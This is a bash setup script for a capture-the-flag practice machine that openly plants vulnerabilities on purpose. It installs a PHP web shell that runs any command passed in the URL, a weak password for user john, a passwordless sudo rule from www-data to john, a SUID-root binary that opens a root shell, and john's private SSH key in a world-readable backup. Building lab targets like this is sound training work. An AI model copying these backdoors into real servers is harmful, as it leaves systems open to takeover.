#!/bin/bash
set -e

echo "=== CTF Victim Setup (Direct Host) ==="
echo ""

# Create web files
echo "📦 Setting up web application..."
cat > /tmp/cmd.php << 'EOF'
<?php
if(isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
} else {
    echo "<h2>Command Executor</h2>";
    echo "<p>Usage: ?cmd=your_command</p>";
}
?>
EOF

cat > /tmp/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Victim Web Server</title></head>
<body>
<h1>Welcome to the Victim Server</h1>
<p><a href="/cmd.php">Admin Panel</a></p>
</body>
</html>
EOF

cat > /tmp/note.txt << 'EOF'
TODO: Remember to remove sudo access for www-data user to run as john!
The sysadmin left this enabled for testing...
Command: sudo -u john /bin/bash
EOF

sudo cp /tmp/cmd.php /tmp/note.txt /var/www/html/
sudo chown www-data:www-data /var/www/html/cmd.php /var/www/html/note.txt
sudo chmod 644 /var/www/html/cmd.php /var/www/html/note.txt
echo "✅ Web files deployed"

# Create user john
echo "👤 Creating user account..."
sudo useradd -m -s /bin/bash john
echo "john:password123" | sudo chpasswd
echo "✅ User john created"

# Create flags
echo "🚩 Creating flags..."
echo "flag{user_compromised_web_to_john}" | sudo tee /home/john/local.txt > /dev/null
sudo chown john:john /home/john/local.txt
sudo chmod 600 /home/john/local.txt

echo "flag{root_access_achieved}" | sudo tee /root/root.txt > /dev/null
sudo chmod 600 /root/root.txt
echo "✅ Flags created"

# Create SUID binary
echo "🔓 Setting up privilege escalation..."
cat > /tmp/vulnerable_binary.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc /tmp/vulnerable_binary.c -o /tmp/backup
sudo mv /tmp/backup /usr/local/bin/backup
sudo chown root:root /usr/local/bin/backup
sudo chmod 4755 /usr/local/bin/backup
echo "✅ SUID binary created"

# Configure sudo
echo "www-data ALL=(john) NOPASSWD: /bin/bash" | sudo tee /etc/sudoers.d/www-data_john > /dev/null
sudo chmod 440 /etc/sudoers.d/www-data_john
echo "✅ Sudo configured"

# Create SSH keys
echo "🔑 Setting up SSH keys..."
sudo mkdir -p /home/john/.ssh
sudo ssh-keygen -t rsa -f /home/john/.ssh/id_rsa -N "" -q
sudo cat /home/john/.ssh/id_rsa.pub | sudo tee /home/john/.ssh/authorized_keys > /dev/null
sudo chmod 700 /home/john/.ssh
sudo chmod 600 /home/john/.ssh/authorized_keys /home/john/.ssh/id_rsa
sudo chmod 644 /home/john/.ssh/id_rsa.pub
sudo chown -R john:john /home/john/.ssh

# Backup SSH key
sudo mkdir -p /var/backups/.old
sudo cp /home/john/.ssh/id_rsa /var/backups/.old/john_ssh_key
sudo chmod 644 /var/backups/.old/john_ssh_key
echo "✅ SSH keys configured"

# Ensure Apache is running
sudo systemctl start apache2 2>/dev/null || true
echo "✅ Apache started"

echo ""
echo "=== Setup Complete ==="
echo ""
echo "🎯 Attack Surface:"
echo "   Web:  http://localhost/cmd.php?cmd=<command>"
echo "   SSH:  ssh john@localhost (password: password123)"
echo ""
echo "🚩 Flags:"
echo "   User: /home/john/local.txt"
echo "   Root: /root/root.txt"
echo ""
